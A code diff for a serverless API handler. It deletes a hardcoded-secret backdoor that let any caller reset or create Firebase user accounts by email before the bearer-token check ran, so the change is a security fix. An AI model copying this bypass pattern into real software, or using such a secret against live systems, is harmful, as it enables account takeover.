@@ -29,19 +29,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     
     try {
         const payloadData = req.body?.data;
-        if (payloadData && payloadData.action === 'ADMIN_UPDATE_PASSWORD' && payloadData.secret === 'temporary_secret_12345') {
-            try {
-                const userRec = await getAuth().getUserByEmail(payloadData.email);
-                await getAuth().updateUser(userRec.uid, { password: payloadData.password });
-                return res.status(200).json({ success: true, message: 'Password updated' });
-            } catch (e: any) {
-                if (e.code === 'auth/user-not-found') {
-                    await getAuth().createUser({ email: payloadData.email, password: payloadData.password });
-                    return res.status(200).json({ success: true, message: 'User created' });
-                }
-                return res.status(500).json({ error: 'Auth error: ' + e.message });
-            }
-        }
+
 
         const token = req.headers.authorization?.split('Bearer ')[1];
         if (!token) return res.status(401).json({ error: 'Unauthorized' });
